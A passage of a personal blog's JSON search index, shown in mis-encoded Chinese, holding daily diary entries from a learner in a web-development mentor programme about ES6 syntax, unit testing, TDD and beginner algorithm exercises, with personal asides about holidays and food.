»æœ‰è¶£çš„ï¼ŒåŸä¾†å¯¦éš›åšæ¸¬è©¦æ˜¯é€™æ¨£å­çš„æ„Ÿè¦ºã€‚å¦å¤–ä¹Ÿæœ‰è·Ÿè‘—ç©äº†ä¸€ä¸‹ TDDï¼ˆTest-driven developmentï¼‰çš„é–‹ç™¼æ–¹å¼ï¼Œè¦ºå¾—é€™ä¹Ÿè¨±æ˜¯æœªä¾†å¯ä»¥å˜—è©¦çœ‹çœ‹çš„æ¨¡å¼ï¼Œæ„Ÿè¦ºåšå‡ºä¾†çš„æ±è¥¿æœƒæ¯”ä¸€èˆ¬çš„é–‹ç™¼æ–¹å¼æ›´å¯é ï¼ å¦å¤–ä¹Ÿè »é–‹å¿ƒé‡æ–°èªè­˜äº† ES6 çš„æ–°èªæ³•ï¼Œå„˜ç®¡ä»¥å‰å°±å·²ç¶“åœ¨ç¶²è·¯ä¸Šçœ‹éä¸€äº›æ•™å­¸æ–‡ç« ï¼Œä½†ç¸½é‚„æ˜¯åŠçŸ¥åŠè§£çš„æ„Ÿè¦ºï¼Œæ²’æœ‰çœŸæ­£ç†è§£æ¯å€‹èªæ³•çš„ä½¿ç”¨æ–¹å¼ã€‚ å…¶ä¸­æœ€ç‰¹åˆ¥çš„æ˜¯è§£æ§‹å‰¯å€¼èˆ‡å±•é–‹é‹ç®—å­å§ï¼ŒåŸä¾†ç”¨ã€Œå°æ‡‰ã€è·Ÿã€Œæ‹†é–‹ã€é€™å…©å€‹ç°¡å–®çš„æ¦‚å¿µå°±å¯ä»¥ç”¨å¾ˆç°¡å–®çš„æ–¹å¼ç†è§£é€™å…©å€‹æ±è¥¿åœ¨åšä»€éº¼ï¼Œå¯¦åœ¨æ˜¯å¤ªè®“äººéœ‡é©šäº†ã€‚ ä»¥å‰çš„è‡ªå·±å¤ªå®¹æ˜“æ­»è¨˜æ±è¥¿äº†ï¼Œæ‰€ä»¥å­¸çš„æ•ˆæœæ‰æœƒæ²’æœ‰å¾ˆå¥½çš„æ„Ÿè¦ºã€‚é›–ç„¶ä¸çŸ¥é“ç¾åœ¨æœƒä¸æœƒæœ‰äº›åœ°æ–¹é‚„æ˜¯åšå¾—ä¸å¤ªå¥½ï¼Œä½†æ˜¯å¸Œæœ›è‡ªå·±èƒ½é€æ¼¸æ”¹å–„ï¼Œè®“è‡ªå·±ä¸€å¤©æ¯”ä¸€å¤©é‚„è¦æ›´é€²æ­¥ã€‚ é¡Œå¤–è©±å¸Œæœ›è–èª•ç¯€å¯ä»¥åƒåˆ°å¥½åƒçš„è›‹ç³•æˆ–æ˜¯è–‘é¤…ã€‚ï¼ˆå› ç‚ºç¾åœ¨æ˜¯åŠå¤œï¼Œæ‰€ä»¥è–èª•ç¯€æ‰å‰›é–‹å§‹è€Œå·² &gt;&lt;ï¼‰ æœŸè¨±ä»Šå¤©é æœŸçš„é€²åº¦æ²’æœ‰é”åˆ°ï¼ˆ[JS102] èˆ‡ [ALG101]ï¼‰ï¼Œå¸Œæœ›æ˜å¤©å¯ä»¥æŠŠå®ƒå¯¦ç¾ï¼","link":"/2021/12/25/mentor-program-day14/"},{"title":"mentor-program-day15","text":"æƒ³å†éä¸€æ¬¡è–èª•ç¯€ã€‚ é€²åº¦ä»Šå¤©æŠŠ [JS102] çµ¦çœ‹å®Œäº†ï¼Œåªæœ‰é€™æ¨£å­ã€‚å› ç‚ºæ˜¨å¤©æ²’æœ‰ç¡å¥½ï¼Œç´¯äº†ï¼Œçµ¦è‡ªå·±ä¼‘æ¯ä¸€å¤©ã€‚ é‚„æ˜¯æœ‰åŠ æ¸›åšä¸€é»ç­†è¨˜ï¼š ES6 çš„å…¶é¤˜é‹ç®—å­ ES6 çš„é è¨­åƒæ•¸å€¼ ES6 çš„ç®­é ­å‡½å¼ ES6 çš„æ¨¡çµ„æ©Ÿåˆ¶ babel-node åˆé«”é©— å¦å¤–ä¹Ÿæœ‰æŠŠ æ°´ä»™èŠ±æ•¸ é€™ä¸€é¡Œçµ¦è§£å‡ºä¾†ã€‚ä¸éæˆ‘çœŸçš„ç´¯äº†ï¼Œæ‰€ä»¥æ˜å¤©åœ¨ä¾†æª¢è¨ QQ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©ä¹Ÿæ˜¯æ»¿æ»¿çš„ ES6ï¼Œå…¶ä¸­æœ€æœ‰æ„Ÿçš„æ˜¯ã€Œå…¶é¤˜é‹ç®—å­ã€å§ï¼Œä»¥å‰å¸¸å¸¸åˆ†ä¸æ¸…æ¥šå®ƒè·Ÿã€Œå±•é–‹é‹ç®—å­ã€çš„å·®åˆ¥ï¼›æ‡‰è©²èªªæˆ‘æ ¹æœ¬ä¸çŸ¥é“å…¶é¤˜é‹ç®—å­æ˜¯å¹¹å˜›ç”¨çš„ï¼Œå¯èƒ½å®ƒå¤ªé‚Šç·£äº†ã€‚ä½†é€™æ¬¡æœ‰å¼„æ¸…æ¥šäº†ï¼Œå¸Œæœ›æœªä¾†æœ‰æ©Ÿæœƒèƒ½å¥½å¥½ä½¿ç”¨å®ƒã€‚ å¦å¤–å°±æ˜¯æœ‰é»è®“äººäº‚ä¸ƒå…«ç³Ÿçš„ import è·Ÿ exportã€‚è©²æ€éº¼èªªï¼Œå¯«æ³•å¯¦åœ¨æœ‰é»å¤šæ¨£ï¼Œæœ‰çš„æ™‚å€™é‚„æœƒä¸å°å¿ƒè·Ÿ CommonJS çš„ exports è·Ÿ module.exports çµ¦ææ··ã€‚å› æ­¤é€™æ¬¡ç­†è¨˜åšå¥½åšæ»¿ï¼Œä¹Ÿæœ‰é‡æ¸… ES6 è·Ÿ CommonJS çš„å·®ç•°æ‰€åœ¨ï¼Œå¸Œæœ›ä»¥å¾Œä¸æœƒå†ææ··ã€‚ é¡Œå¤–è©±é›–ç„¶ä»Šå¤©æ²’æœ‰åƒåˆ°è›‹ç³•ï¼ˆå› ç‚ºä¸‹é›¨ï¼‰ï¼Œä½†é‚„æ˜¯è »é–‹å¿ƒçš„ä¸€å¤©ã€‚è·Ÿå¥³æœ‹å‹å¾…åœ¨ä¸€èµ·å…¶å¯¦å°±æ˜¯æœ€å¹¸ç¦çš„äº‹ã€‚ æœŸè¨±æ˜å¤©å¦‚æœæ²’æœ‰éå¤ªå—¨çš„è©±ï¼Œå¸Œæœ›æŠŠ [ALG101] çš„é€²åº¦çµ¦è£œå®Œï¼Œè·Ÿèƒ½é–‹å§‹åš week3 çš„ä½œæ¥­çš„è©±å°±å¥½äº†ã€‚","link":"/2021/12/25/mentor-program-day15/"},{"title":"mentor-program-day16","text":"æ™‚é–“éç‰¹åˆ¥å¿«çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©é€²åº¦å¾ˆ lowï¼Œåªæœ‰è·Ÿè‘— [ALG101] çš„é€²åº¦åšäº†å¹¾é¡Œé¡Œç›®ã€‚ä¸»è¦æ˜¯èŠ±äº†æ¯”è¼ƒå¤šæ™‚é–“åœ¨æª¢è¨è·Ÿè¤‡ç¿’ä¹‹å‰å¯«å®Œçš„é¡Œç›®ï¼š åˆ¤æ–·ç­‰æ¯”æ•¸åˆ— æ°´ä»™èŠ±æ•¸ å°å‡ºè–èª•æ¨¹ å­¸åˆ°çš„äº‹æƒ…åœ¨æª¢è¨é¡Œç›®æ™‚ï¼Œç™¼ç¾çœŸçš„è¦å†æ¬¡è¤‡ç¿’æ‰æœƒçŸ¥é“è‡ªå·±æœ‰æ²’æœ‰çœŸçš„ç†è§£ã€‚å¾ˆå¤šæ™‚å€™ç•¶ä¸‹éƒ½æœƒä»¥ç‚ºæ‡‚äº†ï¼Œä½†éä¸€æ®µæ™‚é–“å†å›ä¾†çœ‹å°±åˆæ»¿è‡‰å•è™Ÿ QQã€‚ é›–ç„¶è‡ªå·±ç›¡é‡éƒ½æ˜¯åœ¨è§£å®Œé¡Œç›®å¾Œæ‰å»çœ‹æª¢è¨å½±ç‰‡ï¼Œä¸éçœ‹å®Œå¾Œéƒ½æœƒè¦ºå¾—è‡ªå·±çš„è§£æ³•æ²’æœ‰å¾ˆæ¼‚äº®ï¼Œæˆ–æ˜¯é‚è¼¯ä¸å¤ é †æš¢çš„å•é¡Œã€‚å¦å¤–ï¼Œè®Šæ•¸çš„å‘½åçœŸçš„èƒ½ç®—æ˜¯ä¸€é–€å­¸å•ï¼Œæœ‰æ™‚å€™æ€éº¼å–éƒ½è¦ºå¾—æ€ªè£¡æ€ªæ°£çš„ï¼Œé›–ç„¶ä¹Ÿä¸ç”¨å¤ªç³¾çµå°±æ˜¯äº†ã€‚ å…¶å¯¦æ¯æ¬¡è§£å®Œä¸€é“é¡Œç›®ï¼Œæª¢è¨ä¹‹å¾Œå°±èƒ½å­¸åˆ°ä¸€äº›æ–°çš„æŠ€å·§ï¼Œæˆ–æ˜¯æ–°çš„ç´°ç¯€ï¼Œæ‰€ä»¥é‚„è »å–œæ­¡åšé¡Œç›®çš„ã€‚ä¹Ÿæœ‰ä¸€å€‹å¾ˆé…·çš„äº‹æƒ…ï¼Œå°±æ˜¯æˆ‘å­¸äº†é€™éº¼ä¹…é‚„çœŸçš„ä¸çŸ¥é“ JavaScript æœ‰æä¾›ç§‘å­¸è¨˜è™Ÿçš„è¡¨ç¤ºæ–¹å¼ï¼ŒçœŸæ˜¯å¤ªç¥å¥‡äº† XD é¡Œå¤–è©±ã€Œé»‘å¥³å·«è‚‰æ¡‚å¯å¯ã€å¤§æ¦‚æ˜¯å…¨è¯ç›®å‰å‡ºéæœ€å±Œçš„è›‹ç³•ï¼Œä½œç‚ºè–èª•ç¯€çš„æ…¶ç¥è›‹ç³•å†é©åˆä¸éäº†ã€‚å¯æƒœå®ƒæ˜¯æœŸé–“é™å®šï¼Œ01/06 å¾Œå°±è²·ä¸åˆ°äº†ï¼Œé€™å¹¾å¤©å¯èƒ½æœƒå†è²·ä¾†åƒçˆ† QQ é¬¼æ»…çœŸçš„å¤ªæœƒåŠäººèƒƒå£å•¦å•¦å•¦ï¼Œä¸€å€‹ç¦®æ‹œä¸€é›†ç°¡ç›´éä»½ã€‚ æœŸè¨±æ˜å¤©å¸Œæœ›èƒ½æŠŠ [ALG101] è·Ÿå®Œ unit6 çš„é€²åº¦ï¼Œç„¶å¾Œé–‹å§‹æŠŠ week3 çš„ä½œæ¥­çµ¦å®Œæˆã€‚","link":"/2021/12/27/mentor-program-day16/"},{"title":"mentor-program-day17","text":"åšäº†å¾ˆå¤šé¡Œç›®çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©ä¸»è¦å°±æ˜¯åš LIOJ ä¸Šçš„é¡Œç›®ï¼Œç´€éŒ„å¹¾å€‹æˆ‘è¦ºå¾—è »æœ‰è¶£çš„é¡Œç›®ï¼š ä¿¡ç”¨å¡è™Ÿé©—è­‰ ç”Ÿå‘½éˆæ•¸ åˆ¤æ–·è¿´æ–‡ å¦å¤–è§£é¡Œçš„éç¨‹ä¹Ÿæœ‰åšå¹¾å€‹æ–°çš„ç­†è¨˜ï¼Œç‰¹åˆ¥æ˜¯ã€Œæ­£å‰‡è¡¨é”å¼ã€çš„éƒ¨åˆ†ï¼š æ€éº¼ç”¨æ­£å‰‡è¡¨é”å¼é™åˆ¶é€£çºŒæ¬¡æ•¸ æŠŠå­—ä¸²è½‰æˆæ•¸å­—çš„ 4 ç¨®æ–¹æ³• å­¸åˆ°çš„äº‹æƒ…ç¾åœ¨åšé¡Œç›®çš„æ™‚å€™ï¼Œé™¤äº†ç”¨ç¨‹å¼ä¸‰å¯¶ä¹‹å¤–ä¹Ÿæœƒæ€è€ƒæ€éº¼ç”¨å…§å»ºå‡½å¼ä¾†è®“ç¨‹å¼ç¢¼è®Šå¾—æ›´ç°¡æ½”ã€‚ä¸€å€‹é¡Œç›®æˆ‘éƒ½æœƒç”¨å…©ç¨®è§£æ³•ä¾†è§£è§£çœ‹ï¼Œé›–ç„¶é€™æ¨£ç›¸å°ä¹Ÿæ¯”è¼ƒèŠ±æ™‚é–“ï¼Œä½†è¦ºå¾—èƒ½å­¸åˆ°çš„æ±è¥¿ä¹Ÿæ¯”è¼ƒå¤šï¼š æ¸¬è©¦è‡ªå·±èƒ½ä¸èƒ½ä¸ä¾è³´å…§å»ºå‡½å¼ æ¸¬è©¦è‡ªå·±èƒ½ä¸èƒ½ç”¨å…§å»ºå‡½å¼ä¾†çœå»æ²‰é•·çš„ç¨‹å¼ç¢¼ é›–ç„¶åšçš„é¡Œæ•¸ä¸å¤šï¼Œä½†æˆ‘å­¸åˆ°å¾ˆå¤šã€‚ å¦å¤–åœ¨å­¸äº† Unit test å¾Œï¼Œåšæ¸¬è©¦çš„æ™‚å€™èƒ½æƒ³åˆ°æ›´å¤šå¯èƒ½å‡ºç¾çš„æƒ…æ³ï¼Œæ„Ÿè¦ºå¾ˆè »æœ‰è¶£çš„ï¼Œä¹Ÿå› ç‚ºé€™æ¨£æƒ³åˆ°äº†å¥‡è‘©çš„ inputï¼Œé †é“çš„å°±è¤‡ç¿’äº†ä¸€äº›æ­£å‰‡è¡¨é”å¼çš„æ‡‰ç”¨ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œæ„Ÿè¦ºè‡ªå·±ç¾åœ¨å¯« code çš„æ™‚å€™æœƒè€ƒæ…®çš„æ¯”ä»¥å‰æ›´å‘¨å…¨ï¼Œä¸ç®¡æ˜¯é‚Šè§’æ¡ˆä¾‹æˆ–è¼¸å…¥é©—è­‰éƒ½èƒ½è¨­æƒ³çš„æ›´å‘¨åˆ°ï¼Œå¦å¤–ä¹Ÿè »å–œæ­¡ TDD çš„é–‹ç™¼æ–¹å¼ï¼Œçœ‹åˆ°ä¸€æ’ç¶ ç‡ˆäº®èµ·æ™‚çœŸçš„æœƒæœ‰å¿ƒèŠ±æ€’æ”¾çš„æ„Ÿè¦º â—‰â€¿â—‰ å¸Œæœ›æ¥ä¸‹ä¾†çš„è·¯ç¨‹ä¸­èƒ½å­¸åˆ°è¶Šä¾†è¶Šå¤šæ±è¥¿ã€‚ é¡Œå¤–è©±æ˜å¤©æ˜¯éº¥ç•¶å‹é›å¡Šè²·ä¸€é€ä¸€æ´»å‹•çš„æœ€å¾Œä¸€å¤©ï¼Œåƒçˆ†åƒçˆ†ã€‚ æœŸè¨±æ„Ÿè¦ºå¾—é–‹å§‹è¶•é»é€²åº¦ï¼Œå¸Œæœ›æ˜å¤©è‡³å°‘æŠŠ [ALG101] çš„ unit6 å®Œæˆï¼Œç„¶å¾Œé–‹å§‹åš week3 çš„ä½œæ¥­ã€‚","link":"/2021/12/28/mentor-program-day17/"},{"title":"mentor-program-day18","text":"ä¸€æ¨£æ˜¯åšé¡Œç›®çš„ä¸€å¤©ã€‚ é€²åº¦åšé¡Œç›®é›–ç„¶èƒ½å­¸åˆ°è »å¤šæ±è¥¿ï¼Œä½†ä¹Ÿç¢ºå¯¦æ¯”è¼ƒèŠ±æ™‚é–“ã€‚ä»Šå¤©æŠŠ [ALG101] unit5 çš„æŒ‡å®šé¡Œç›®åšå®Œäº†ï¼Œæ˜å¤©æ‡‰è©²å°±è¶•å¿«è¶•ä¸Šè©²æœ‰çš„é€²åº¦ã€‚ ä»Šå¤©ä¹Ÿæœ‰æŠŠä¸€äº›è¦ºå¾—ä¸éŒ¯çš„é¡Œç›®çµ¦ç­†è¨˜ï¼š å¹³é¢è·é›¢è¨ˆç®— å‡±è–©åŠ å¯† å…¶å¯¦æ‡‰è©²é‚„æœ‰å€‹åœˆåœˆå‰å‰ï¼Œä½†ä¾†ä¸æ€¥åšå®Œï¼Œæ‰€ä»¥æ˜å¤©å†è£œä¸Šã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©åšçš„é¡Œç›®éƒ½è·Ÿæ‰¾è¦å¾‹æœ‰é—œï¼Œè¦ºå¾—è‡ªå·±æœ‰æ¯”è¼ƒçŸ¥é“è¦æ€éº¼æ‰¾è¦å¾‹ä¸€é»ï¼Œä¸€å€‹é¡Œç›®ä¹Ÿæ¯”è¼ƒèƒ½æƒ³åˆ°ä¸€ç¨®ä»¥ä¸Šçš„è§£æ³•ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯è‡ªå·±é¡Œç›®åšå¤šäº†æ‰€ä»¥æ€è€ƒçš„æ–¹å¼æœ‰è®Šå²å®³äº†ï¼ˆå¸Œæœ›æ˜¯ï¼‰ã€‚ é¡Œå¤–è©±åƒæ±è¥¿å¾ˆå¿«æ¨‚ï¼Œä½†åƒæ±è¥¿èº«æåˆæœƒè®Šè…«ï¼ŒçœŸæ˜¯ä»¶å‚·è…¦ç­‹çš„äº‹æƒ…ã€‚ æœŸè¨±æ˜å¤©å¸Œæœ›å¯ä»¥æŠŠ [ALG101] çš„é€²åº¦è£œå®Œï¼ˆé€™å€‹æœŸè¨±å¥½åƒæœ‰é»å¤šæ¬¡äº†ï¼Œå¸Œæœ›çœŸçš„èƒ½å®Œæˆï¼‰ï¼Œé‚„æœ‰ week3 çš„ä½œæ¥­è·Ÿé–‹å§‹é€²è¡Œ week4 çš„é€²åº¦ã€‚","link":"/2021/12/29/mentor-program-day18/"},{"title":"mentor-program-day19","text":"éå¾—å¾ˆå¿«å»ä¹Ÿæ¼«é•·çš„åšé¡Œç›®æ™‚é–“ã€‚ é€²åº¦ä»Šå¤©çœ‹äº† [ALG101] unit5 çš„æª¢è¨å½±ç‰‡ï¼Œé‡æ–°å¯©è¦–è‡ªå·±å‰å¹¾å¤©åšçš„é¡Œç›®å¦‚ä½•ï¼Œæœ‰å­¸åˆ°ä¸€äº›æ–°çš„è§£æ³•ï¼Œéƒ½è¨˜éŒ„åœ¨æˆ‘çš„ repo è£¡é¢äº†ã€‚ æ¥è‘—ä¹Ÿé–‹å§‹åš [ALG101] unit6 å…§å»ºå‡½å¼çš„éƒ¨åˆ†ï¼Œé›–ç„¶é‚„æ²’å…¨éƒ¨åšå®Œï¼Œä½†ç›¸ä¿¡æ˜å¤©å°±èƒ½æå®šäº†ã€‚ å¦å¤–ä¹Ÿæœ‰æŠŠæ˜¨å¤©çš„å‘å¡«å®Œï¼Œé‚„æœ‰ä¸€äº›ç°¡å–®çš„ç´€éŒ„ï¼š åœˆåœˆå‰å‰ å…©ç¨®å¯¦ä½œ trim çš„æ–¹æ³• å¤§æ¦‚å°±æ˜¯é€™æ¨£ï¼ å­¸åˆ°çš„äº‹æƒ…åœ¨æª¢è¨ã€Œå¹³é¢è·é›¢è¨ˆç®—ã€çš„æ™‚å€™ç‰¹åˆ¥æ·±åˆ»ï¼Œå› ç‚ºæœ‰äººåœ¨ç•™è¨€å€æä¾›äº†ä¸€å€‹å¾ˆç°¡æ½”çš„è§£æ³•ï¼Œè¦ºå¾—é€™è§£æ³•çœŸçš„å¤ æ½®ï¼Œä¹Ÿå¹«æˆ‘è¤‡ç¿’äº†å‰å¹¾å¤©å­¸åˆ°çš„æ±è¥¿ï¼Œæ‰€ä»¥ä¹Ÿä¸æ„å¤–çš„ è¨˜éŒ„ ä¸‹ä¾†äº†ã€‚ è¦ºå¾—å¤šçœ‹åˆ¥äººçš„è§£æ³•æ˜¯ä»¶å¾ˆæœ‰è¶£çš„äº‹æƒ…ï¼Œä¹Ÿèƒ½å¾ä¸­å­¸åˆ°ä¸åŒçš„æ€è€ƒæ–¹å¼ï¼Œå¸Œæœ›è‡ªå·±æ¥ä¸‹ä¾†è®Šå¾—è¶Šä¾†è¶Šå¼·ã€‚ é¡Œå¤–è©±é›–ç„¶å¤©æ°£å¾ˆå†·ï¼Œä½†é‚„æ˜¯å¸Œæœ›èƒ½å …å®ˆæ¯å€‹ç¦®æ‹œè‡³å°‘æ…¢è·‘ä¸€æ¬¡çš„ç¿’æ…£ã€‚é›–ç„¶æœ‰æ™‚å€™è¦ºå¾—æ…¢è·‘é‚„è »ç´¯çš„ï¼Œä½†æ˜¯åœ¨æ¯å¤©è™•æ–¼å­¸ç¿’çš„ç‹€æ…‹ä¸‹ï¼Œé€™æ˜¯ä¸€æ®µèƒ½è®“å¿ƒæƒ…æ²‰æ¾±ä¸€ä¸‹çš„å°æ™‚å…‰ï¼Œé€™æ¨£å­æƒ³å°±æœƒè¦ºå¾—ä¹Ÿæ²’é‚£éº¼è¾›è‹¦ã€‚ æœŸå¾…è·¨å¹´å¤œçš„åˆ°ä¾†ï½ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½é€²åˆ° week4 çš„é€²åº¦ï¼Œé€™é€±çš„å…§å®¹ç®—æ˜¯ç¬¬ä¸€æ¬¡æ¥è§¸ï¼Œé‚„è »æœŸå¾…çš„ã€‚","link":"/2021/12/29/mentor-program-day19/"},{"title":"mentor-program-day20","text":"æ–°å¹´å¿«æ¨‚ã€‚ é€²åº¦çµ‚æ–¼æŠŠ [ALG101] çš„ unit6 çµ¦å®Œæˆã€‚èŠ±äº†ä¸å°‘æ™‚é–“ï¼Œä½†å­¸åˆ°å¾ˆå¤šæ±è¥¿ï¼Œå…¶å¯¦é‚„æ˜¯è »å€¼å¾—çš„ã€‚å¦å¤–ä¹ŸæŠŠ [JS101] çš„é€²åº¦è£œå®Œï¼Œåªå·®æª¢è¨å½±ç‰‡é‚„æ²’çœ‹è€Œå·²ï¼Œä½†æ‡‰è©²å¾ˆå¿«å°±èƒ½å®Œæˆã€‚ ä¸€æ¨£é™„ä¸Šä»Šå¤©åšçš„ä¸€äº›ç­†è¨˜ï¼š å¯¦ä½œ join çš„ä¸‰ç¨®æ–¹æ³• è²»å¼æ•¸åˆ— æ‰¾å‡ºç¬¬ n å€‹æœ€å°å€¼ é‚„æœ‰æ›´æ–°ä¸€äº›å¯¦ä½œçš„éƒ¨åˆ†ï¼š å¯¦ä½œå­—ä¸²å…§å»ºå‡½å¼ å¯¦ä½œé™£åˆ—å…§å»ºå‡½å¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©ä¸€æ¨£å­¸åˆ°äº†å¾ˆå¤šä¸åŒçš„è§£é¡Œæ€ç¶­ï¼Œè¦ºå¾—ä¸€å€‹é¡Œç›®æœ‰å„ç¨®è§£æ³•æ˜¯å¯«ç¨‹å¼æœ€æœ‰è¶£çš„åœ°æ–¹ã€‚ é‚„æœ‰ä¸€ä»¶æœ€æœ‰è¶£çš„äº‹æƒ…æ˜¯åœ¨åšã€Œè²»å¼æ•¸åˆ—ã€çš„æ™‚å€™æ·±æ·±é«”æœƒåˆ°ã€Œæ™‚é–“è¤‡é›œåº¦ã€å¸¶ä¾†çš„å½±éŸ¿ï¼Œé‚„æœ‰ã€Œç”¨ç©ºé–“æ›å–æ™‚é–“ã€é€™ä»¶äº‹æƒ…å¸¶ä¾†çš„æ•ˆç›Šé è¶…ä¹æˆ‘æƒ³åƒä¾†çš„å¤§ã€‚ä¸€å€‹ç°¡å–®çš„ä¾‹å­è®“æˆ‘æ·±æ·±é«”æœƒåˆ°æ¼”ç®—æ³•æ˜¯ä¸€å€‹å¾ˆé‡è¦çš„æ±è¥¿ã€‚ å¸Œæœ›ä»¥å¾Œæœ‰æ™‚é–“çš„è©±èƒ½é‘½ç ”æ›´å¤šè·Ÿæ¼”ç®—æ³•æœ‰é—œçš„çŸ¥è­˜ã€‚ é¡Œå¤–è©±ä»Šå¤©å°±æ˜¯è·¨å¹´äº†ï¼Œå…ˆèªªè²æ–°å¹´å¿«æ¨‚ï¼Œå¸Œæœ›åœ¨é€™ä¸€å¤©çš„æ¯å€‹äººéƒ½èƒ½æ„Ÿåˆ°é–‹å¿ƒã€‚ æœŸè¨±æ˜å¤©æ‡‰è©²æœƒçµ¦è‡ªå·±æ”¾ä¸€å¤©å‡ï¼Œè·Ÿå¥³å‹å¥½å¥½æ•£æ•£å¿ƒï¼Œæ‰€ä»¥ä¸æœƒæœ‰é€²åº¦ã€‚","link":"/2021/12/31/mentor-program-day20/"},{"title":"mentor-program-day21","text":"è½èªªä»Šå¤©æ”¾å‡ï¼Ÿ æœ‰æ²’æœ‰å …æŒåšéæŸä»¶äº‹æƒ…å¾ˆä¹…å‘¢ï¼Ÿæ—¢ç„¶ä»Šå¤©ä¼‘å‡ï¼Œé‚£å°±ä¾†åˆ†äº«ä¸€ä¸‹è‡ªå·±ç”Ÿæ´»ä¸Šçš„äº‹æƒ…å¥½äº†ã€‚ å…¶å¯¦æˆ‘æ¯å¤©éƒ½æœ‰ä¸€å€‹ç¿’æ…£ï¼šæ¯å¤©å¯«ä¸‹æ¬¡è‡ªå·±çš„ç›®æ¨™ 15 æ¬¡ æœƒé–‹å§‹åšé€™ä»¶äº‹æƒ…æ˜¯å› ç‚ºæˆ‘åœ¨æŸå€‹åœ°æ–¹è£¡é¢å­¸åˆ°çš„ä¸€ç¨®å“²å­¸å§ï¼Ÿæ“šèªªåªè¦æ¯å¤©é€™æ¨£å­åšï¼Œå°±èƒ½åœ¨ç„¡å½¢ä¸­å¾—åˆ°ä¸€è‚¡å¹«åŠ©ä½ é”æˆç›®æ¨™çš„åŠ©åŠ›ã€‚ å—¯ï¼Œæˆ‘ä¹Ÿè¦ºå¾—è½èµ·ä¾†æŒºççš„ã€‚ æ‰€ä»¥æˆ‘å°±é€™æ¨£ä¸çŸ¥ä¸è¦ºåšäº†å…©å€‹æœˆå·¦å³ï¼š å„˜ç®¡åœ¨æˆ‘åšé€™ä»¶äº‹æƒ…å¾Œï¼Œç¢ºå¯¦æœ‰å¾—åˆ°ä¸€äº›ä»¥å‰æ²’æœ‰çš„æ©Ÿæœƒï¼Œä¾‹å¦‚èªªã€Œæ…¢æ…¢ç´¯ç©å‡ºæ¯”è¼ƒåƒæ¨£çš„ä½œå“ã€ã€ã€Œå¾—åˆ°é¢è©¦çš„æ©Ÿæœƒã€ç­‰ç­‰ï¼Œä½†ä¹Ÿä¸èƒ½èªªé€™å®Œå…¨æ˜¯å› ç‚ºåšäº†é€™ä»¶äº‹æƒ…è€Œå¾—åˆ°ï¼Œç•¢ç«Ÿå¯¦éš›ä¸Šä»˜å‡ºæ›´å¤šçš„æ˜¯ä¸åœçš„å­¸ç¿’èˆ‡åŠªåŠ›ã€‚ ç›®å‰çš„æˆ‘ä¾ç„¶é‚„æ²’å¯¦ç¾é€™å€‹ç›®æ¨™ï¼Œä½†é€™ä»¶äº‹æƒ…åœ¨ä¸çŸ¥ä¸è¦ºä¸­å·²ç¶“è®Šæˆäº†ä¸€ç¨®ç¿’æ…£ï¼Œå½·å½¿æ˜¯çœŸæ˜¯å‡éƒ½ç„¡æ‰€è¬‚äº†ï¼Œåªæ˜¯æƒ³å–®ç´”æƒ³æŠŠä¸€ä»¶äº‹æƒ…å …æŒä¸‹å»çš„é€™ç¨®å¿ƒæƒ…ã€‚ æœªä¾†çš„è·¯æœƒæ€éº¼æ¨£å…¶å¯¦è‡ªå·±ä¹Ÿä¸æ¸…æ¥šï¼Œä½†ç›¸ä¿¡è‡ªå·±ä¾ç„¶åœ¨ä¸€æ­¥ä¸€æ­¥åœ°å‘è‘—ç›®æ¨™å‰é€²ã€‚åªè¦ä¸åœä¸‹è…³æ­¥ï¼Œç¸½æœ‰ä¸€å¤©æœƒåˆ°é”çš„ï¼›å„˜ç®¡é€™å¯èƒ½è¦èŠ±ä¸Šå¾ˆå¤šæ™‚é–“ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œä¸çŸ¥é“é€™å€‹ä¸–ç•Œä¸Šæœ‰å¤šå°‘äººä¹Ÿåƒæˆ‘ä¸€æ¨£ï¼Œç›®å‰ä¹Ÿæ­£åœ¨ä¸åœåœ°å …æŒè‘—åŠªåŠ›å»åšæŸä»¶äº‹ï¼Ÿ æƒ³èªªçš„äº‹æƒ…å¾ˆç°¡å–®ï¼š å¸Œæœ›å¤§å®¶éƒ½èƒ½å¤ å¾—åˆ°è‡ªå·±æ‰€è¿½æ±‚çš„äº‹ç‰©ï¼Œå„˜ç®¡é€™ä»¶äº‹åœ¨åˆ¥äººçœ¼è£¡çœ‹èµ·ä¾†å¾ˆæ¸ºå°ï¼Œä¹Ÿä¸è¦æ”¾æ£„å …æŒä¸‹å»ã€‚å“ªæ€•åªæ˜¯ä¸€ä»¶å°å°çš„äº‹æƒ…ï¼Œåªè¦ç´¯ç©èµ·ä¾†éƒ½æœ‰å¯èƒ½è®Šæˆæ˜¯äººç”Ÿè£¡æ„ç¾©é‡å¤§çš„äº‹ã€‚ æœ€å¾Œåˆ†äº«ä¸€ä¸‹å¥³æœ‹å‹å¾ˆå–œæ­¡çš„æ­Œï¼šå„ªé‡Œï¼ãƒ‰ãƒ©ã‚¤ãƒ•ãƒ©ãƒ¯ãƒ¼ï¼Œä¸€é¦–æœƒè®“å¿ƒæƒ…æ„Ÿåˆ°æ²»ç™’çš„æ­Œ (ï½¡â€¢ã……â€¢ï½¡)â™¡","link":"/2021/12/31/mentor-program-day21/"},{"title":"mentor-program-day22","text":"æ–°å¹´å¾Œçš„ç¬¬ä¸€ç¯‡ï¼Œå»¢äº†å…©å¤©QQ é€²åº¦åœ¨å»¢äº†å…©å¤©å¾Œï¼Œé‚„æ˜¯å¾—å¥½å¥½æ”¶å¿ƒå›ä¾†è¶•é€²åº¦ã€‚ ä»Šå¤©æ­£å¼é–‹å§‹ week4 çš„é€²åº¦ï¼Œæ‰€ä»¥æŠŠ [NET101] çœ‹åˆ°äº† 69%ã€‚å¦å¤–ä¹ŸæŠŠ week3 çš„ä½œæ¥­çµ¦æª¢è¨ä¸€éï¼Œæª¢è¨å¾Œä¹Ÿæ„è­˜åˆ°è‡ªå·±ä¾ç„¶å¾ˆæ·ºçš„äº‹å¯¦ï¼Œå¾—æ›´åŠ å¥½å¥½åŠ æ²¹æ‰è¡Œã€‚ å…¶å¯¦æœ‰è 